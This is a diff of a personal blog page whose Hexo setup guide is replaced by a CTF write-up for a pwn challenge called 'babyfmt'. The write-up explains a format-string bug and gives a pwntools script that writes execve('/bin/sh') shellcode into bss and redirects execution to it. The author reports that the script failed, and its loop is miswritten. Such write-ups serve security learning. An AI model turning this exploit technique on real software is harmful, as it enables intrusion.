@@ -2,10 +2,10 @@
     <meta charset="utf-8">
     
     
-    <title>使用Hexo配合Github搭建自己的博客 | Du4t的博客 | Du4t~~~~</title>
+    <title>UNCTF复现WP(PWN) | Du4t的博客 | Du4t~~~~</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="keywords" content="Others">
+    <meta name="keywords" content="WP">
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
     <link rel="stylesheet" href="/css/style.css?v=1.4.4">
@@ -137,7 +137,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>使用Hexo配合Github搭建自己的博客</span>
+            <span>UNCTF复现WP(PWN)</span>
             
         </div>
         
@@ -150,15 +150,15 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">使用Hexo配合Github搭建自己的博客</h1>
+        <h1 class="title">UNCTF复现WP(PWN)</h1>
         <h5 class="subtitle">
             
-                <time datetime="2019-10-08T06:43:25.000Z" itemprop="datePublished" class="page-time">
-  2019-10-08
+                <time datetime="2019-11-12T12:06:01.000Z" itemprop="datePublished" class="page-time">
+  2019-11-12
 </time>
 
 
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Others/">Others</a></li></ul>
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/WP/">WP</a></li></ul>
 
             
         </h5>
@@ -183,14 +183,14 @@
 
 
 <div class="container body-wrap">
-    <article id="post-使用Hexo配合Github搭建自己的博客" class="post-article article-type-post" itemprop="blogPost">
+    <article id="post-UNCTF复现WP(PWN)" class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">使用Hexo配合Github搭建自己的博客</h1>
+        <h1 class="post-card-title">UNCTF复现WP(PWN)</h1>
         <div class="post-meta">
-            <time class="post-time" title="2019-10-08 14:43:25" datetime="2019-10-08T06:43:25.000Z" itemprop="datePublished">2019-10-08</time>
+            <time class="post-time" title="2019-11-12 20:06:01" datetime="2019-11-12T12:06:01.000Z" itemprop="datePublished">2019-11-12</time>
 
             
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Others/">Others</a></li></ul>
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/WP/">WP</a></li></ul>
 
 
 
@@ -203,53 +203,80 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><strong>1.安装Git Bash</strong></p>
-<p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址</a></p>
-<p>安装流程: 无脑下一步即可<br>安装好后 在任意处右键打开Git Bash 输入</p>
-<blockquote>
-<p>git version</p>
+            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h2><blockquote>
+<p>存在漏洞:格式化字符串漏洞</p>
 </blockquote>
-<p>来查看当前的Git Bash版本 如果客户端正常显示版本即为安装成功</p>
-<p><strong>2.安装Node JS</strong></p>
-<p>由于Hexo是基于Node JS环境的静态博客 所以一般来说还是装一下吧…<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">下载地址</a></p>
-<p>安装流程:下载好之后双击安装 注意勾选 <kbd>Add to Path</kbd> 这样做的好处就是不用自己去配置环境变量了 然后继续下一步即可</p>
-<p><strong>3.安装Hexo</strong></p>
-<p>这就是我们博客的关键了 不用紧张 我们不需要去费尽心思的找安装包 直接创建一个文件夹(以后存放博客的地方) 然后进入文件夹 右键<kbd>Git Bash here</kbd> 然后输入安装命令 <kbd>npm i -g hexo</kbd>静等安装完毕即可 </p>
-<p>在安装完Hexo后就是初始化了 输入初始化命令<br><kbm>hexo init</kbm> 然后等待完成即可</p>
-<h2 id="连接Github"><a href="#连接Github" class="headerlink" title="连接Github"></a>连接Github</h2><p>没有账号的创建账号 这就不说了..有了账号的 新建仓库 仓库名称<strong>必须</strong>为 <strong>自己的用户名.github.io</strong></p>
-<p>在创建完成后 返回到gitbash中 来配置自己的github账户信息</p>
-<p>在Git Bash中输入 </p>
-<p><kbm>git config –global user.name “自己的github用户名”</kbm></p>
-<p><kbm>git config –global user.email “自己注册github的邮箱”</kbm></p>
-<p>接下来就是创建SSH keys将gitbash和github连接起来 在bash中输入 </p>
-<p><kbm>ssh-keygen -t rsa -C “自己的邮箱”</kbm></p>
-<p>然后使用git命令 来复制ssh key</p>
-<p><kbm>paste < ~/.ssh/id_rsa.pub</kbm></p>
-<p>接着打开github的账户设置 选择<em>SSH and GPG keys</em> 然后<em>New SSH key</em> 标题随便填 把复制好的ssh粘进去就完事了 确定粘完之后回到bash 测试是否成功</p>
-<p><kbm>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> </kbm></p>
-<p>如果提示 <kbm>Are you sure you want to continue connecting (yes/no)?</kbm> 输入yes 然后就会看到</p>
-<blockquote>
-<p>Hi ***! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-</blockquote>
-<p>这个时候SSH已经配置成功了 </p>
-<h2 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h2><p>这个时候博客的雏形已经搭建出来了 就是有点丑..我们先去github上 随便找个自己喜欢的主题<br>然后放到<strong>博客根目录下的themes</strong>里即可</p>
-<p>然后打开 <strong>_config.yml</strong> 来具体配置博客的信息 如图所示修改属于自己的信息 将Du4t改成自己的github用户名即可</p>
+<p>照例 下载先查保护</p>
 <figure class="image-box">
-                <a rel="使用Hexo配合Github搭建自己的博客" href="https://i.loli.net/2019/10/08/zuGNOlStARIfHdw.png" title="配置1" data-fancybox="images"><img src="https://i.loli.net/2019/10/08/zuGNOlStARIfHdw.png" alt="1.png" title="配置1" class></a>
-                <p>配置1</p>
-            </figure>
-<figure class="image-box">
-                <a rel="使用Hexo配合Github搭建自己的博客" href="https://i.loli.net/2019/10/08/9vPSRmlU61AyGIk.png" title="配置2" data-fancybox="images"><img src="https://i.loli.net/2019/10/08/9vPSRmlU61AyGIk.png" alt="2.png" title="配置2" class></a>
-                <p>配置2</p>
+                <a rel="UNCTF复现WP(PWN)" href="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt title class></a>
+                <p></p>
             </figure>
 
-<h2 id="书写自己的博客"><a href="#书写自己的博客" class="headerlink" title="书写自己的博客"></a>书写自己的博客</h2><p>在bash中输入<kbm>hexo new 文章名</kbm> 然后就可以去_post文件夹中找到自己的博客了 使用MarkDown语法书写自己的博文即可</p>
-<h2 id="上传github"><a href="#上传github" class="headerlink" title="上传github"></a>上传github</h2><p>还是先安装一波 <kbm>npm install hexo-deployer-git –save</kbm> 安装完成后我们就可以通过bash直接将自己的博客部署到github上让别人看到了 </p>
-<p><em>建议每次都按照以下步骤部署自己的博客！</em></p>
-<p><kbm>hexo clean</kbm></p>
-<p><kbm>hexo g</kbm></p>
-<p><kbm>hexo d</kbm></p>
-<p>等待部署完毕 去 <em>自己的用户名.github.io</em> 就可以看到自己的博客了</p>
+<p>发现保护全关 载入IDA 发现存在格式化字符串漏洞 且输入长度不足以溢出返回地址</p>
+<figure class="image-box">
+                <a rel="UNCTF复现WP(PWN)" href="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>那么肯定是通过写入shellcode 来实现getshell 先去找一个空白的bss段地址</p>
+<figure class="image-box">
+                <a rel="UNCTF复现WP(PWN)" href="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现bss段地址是 0x8049b80开始的 载入IDA查看是否有读写执行权限</p>
+<figure class="image-box">
+                <a rel="UNCTF复现WP(PWN)" href="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>存在读写执行权限 那么接下来就是通过格式化字符串漏洞将shellcode 写入bss段地址 然后利用漏洞修改返回地址为bss段地址即可</p>
+<blockquote>
+<p>这里介绍一下pwntools 针对格式化字符串漏洞的模块 fmtstr_payload</p>
+<p>这是一个函数 函数调用语法是 fmtstr_payload(格式化字符串的偏移,{地址:写入的值})</p>
+<p>执行这个函数就能利用格式化字符串漏洞直接将值写入到指定地址上 比自己算不知道好用多少…</p>
+</blockquote>
+<p>那么直接给出脚本即可 当然 返回地址肯定还是需要先泄漏出来的</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
+file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
+
+read_addr<span class="token operator">=</span><span class="token number">0x80486cd</span>
+puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'%27$p'</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+ret_addr<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ret_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+buf_addr<span class="token operator">=</span>ret_addr<span class="token number">-0x5c</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"buf_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+bss_addr<span class="token operator">=</span><span class="token number">0x8049b80</span>
+
+
+
+shell_code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x6850c031</span><span class="token punctuation">,</span><span class="token number">0x68732f6e</span><span class="token punctuation">,</span><span class="token number">0x622f2f68</span><span class="token punctuation">,</span><span class="token number">0x50e38969</span><span class="token punctuation">,</span><span class="token number">0x8953e289</span><span class="token punctuation">,</span><span class="token number">0xcd0bb0e1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true"># shell_code=[0xf7e652b0,0x0148bbdc,0x5e5ee6d0,0x5ec4d248,0xc1c31848,0xd1eb5348,0x8d3c2404,0x3a0f05]</span>
+
+<span class="token keyword">while</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>shell_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">(</span>bss_addr<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>shell_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+
+
+payload2<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span>ret_addr<span class="token punctuation">:</span>bss_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<blockquote>
+<p>因为这里我是本地打的 试了两份shellcode 都没有打通 感觉还是shellcode的锅 </p>
+</blockquote>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -275,12 +302,12 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-11-12T12:07:19.013Z" itemprop="dateUpdated">2019-11-12 20:07:19</time>
+    最后更新时间：<time datetime="2019-11-14T13:17:40.674Z" itemprop="dateUpdated">2019-11-14 21:17:40</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/" target="_blank" rel="external">http://Du4t.github.io/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/</a>
+        转载注明出处，原文地址：<a href="/2019/11/12/unctf-fu-xian-wp-pwn/" target="_blank" rel="external">http://Du4t.github.io/2019/11/12/unctf-fu-xian-wp-pwn/</a>
         
     </div>
     <footer>
@@ -294,7 +321,7 @@
         
         <div class="post-footer">
             
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Others/">Others</a></li></ul>
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WP/">WP</a></li></ul>
 
             <div class="page-share-wrap">
     
@@ -303,7 +330,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/&title=《使用Hexo配合Github搭建自己的博客》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/12/unctf-fu-xian-wp-pwn/&title=《UNCTF复现WP(PWN)》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -315,7 +342,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/&title=《使用Hexo配合Github搭建自己的博客》 — Du4t的博客&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/12/unctf-fu-xian-wp-pwn/&title=《UNCTF复现WP(PWN)》 — Du4t的博客&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -338,16 +365,16 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2019/10/08/ni-xiang-chang-jian-de-suan-fa/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">逆向常见的算法</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
+  
+    <div class="next">
+      <a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">如何泄漏PWN中的一些信息</h4>
+      </a>
+    </div>
   
 </nav>
 
@@ -357,7 +384,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#下载工具"><span class="post-toc-number">1.</span> <span class="post-toc-text">下载工具</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#连接Github"><span class="post-toc-number">2.</span> <span class="post-toc-text">连接Github</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#配置博客"><span class="post-toc-number">3.</span> <span class="post-toc-text">配置博客</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#书写自己的博客"><span class="post-toc-number">4.</span> <span class="post-toc-text">书写自己的博客</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传github"><span class="post-toc-number">5.</span> <span class="post-toc-text">上传github</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#babyfmt"><span class="post-toc-number">1.</span> <span class="post-toc-text">babyfmt</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </div></div></aside>
@@ -413,7 +440,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/&title=《使用Hexo配合Github搭建自己的博客》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/12/unctf-fu-xian-wp-pwn/&title=《UNCTF复现WP(PWN)》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -425,7 +452,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/&title=《使用Hexo配合Github搭建自己的博客》 — Du4t的博客&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/12/unctf-fu-xian-wp-pwn/&title=《UNCTF复现WP(PWN)》 — Du4t的博客&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -437,7 +464,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsUlEQVR42u3aQW4bMRAEQP3/0w4Q5JActOnmcBQjqD0Ja4li0cBy1MPXK76+fl75X9+9/+u369395+u1ceHh4eEdTf15uHzo/FMJ4Hk+0RLg4eHhrfHaibbTOtsq2oXDw8PD+268d1+QTy5ZDjw8PLz/iXcrPkgWq11QPDw8vM/zkjDi7J23Suf1rAUPDw9voYv0fV4v9vfw8PDwBl31tiU22VTyeKIYDQ8PD2+B91zsJs/b5H6+BO2Bg2jDwMPDw1vjtbXo2UGBJIS93DzDw8PDW+Alj/WzYvpu66sdGQ8PD2+blzzi5xtA2xK70NzCw8PDu8qbBLXzKeYLdzgTPDw8vGXeJIzIQ4HkziRE/uM1Hh4e3hpv0r5qS/CksD4bJzophoeHhzfmtUemzr6+DWfPjhTg4eHh/Sve2cmllp1P96xVhoeHh7fHSx7B7SGnNoDIS/N2E8LDw8Pb4z3Hss8P8XyE/JDW2YIWDTA8PDy8Ma+dyiTMPSup20YdHh4e3h6vLWrzJlkbLhTTLY924eHh4W3wko0hf09ecM/D3OIABB4eHt5V3t0GVXLnVsOs+L/h4eHhLfCSOKAYNC6a29Ch3lrw8PDwPsLLN4nkIZ6HsHkhnoyAh4eHt8d7/sGfR6t59HAGG80BDw8Pb4F3K0g9e3BPjmHVGDw8PLwxL48A8om240/CiL8sNB4eHt4ab9ISS2LZtkzPd7MihsDDw8Mb877KK2+M5SV13gzLI4xfr/Hw8PAWeGdhRLTbtA2qmN1uZnh4eHgbvGQz+GTocHZQ4O1n8fDw8NZ4+Y/8yUTz9v+1Fh0eHh7eN+PlZfekoZUHE5c3Bjw8PLwxrwXnrbKzaLgII/Dw8PAWeHmzvy242zZVW76/2r0FDw8Pb8ybNMDawwG32mZ1mIuHh4d3h/cDt1m7YEwxgfMAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACHUlEQVR42u3aS27DMAwFwN7/0u62RRD1kXQKWBqvAtdKNF6w/OjrK76uH9frneT+67e9+/xu1Q0XBgbGYxnX8koYvRex/vV8bxgYGOcwqmFxzbuLmuwNAwMDY/5MdbsYGBgY9wbcCSxPQDEwMDDyIjYpOx9Qi2NgYDyQkSdz///5I/MNDAyMRzGu4rWGJcE0f02FXWFgYGzNyANcNXHMvycqUJNEEwMDY2tG0vzqDQnWq/KCtpAsYmBgbMeoJnP5Xydjy3zM8CvDxcDA2JTRa/pXC91eWtn8j4GBgbEpI0/deulgHoKrR0AwMDBOZtx73KE3Eqi+UAwMjF0ZyWByfuYhCbKjcI+BgXEAI0/R8tZ/ddWkkMbAwDiHMSksq43+6kGxP9ZiYGBszZhvbt3uz9fe0O3HwMA4hlHddPXQWLWILQw4MTAwtmbkobN3bKLXqmsOMjEwMLZm5AG392T1mVEZjIGBcRhjco6j2rzLE8RywMXAwHg4o7c4T+YmDbvCb2FgYBzJSL4uGSrMRwvN+QYGBsYBjLwQrTbd8uFl4aVgYGBsyriK1ySZy8cG5VUYGBhbM+YjxmpbLUkrk/DdC9kYGBjPZUwOUiQb+lzAxcDAOI0xCXzVrUzSvrchGwMDAyNunFVbcnkQL5wTwcDAOJ6RB9nm2bReGYyBgXEAozoMSArRfO2k0MXAwDiBUQ156/t3NeAmCSsGBsZGjG8Y0OTzTgquFwAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
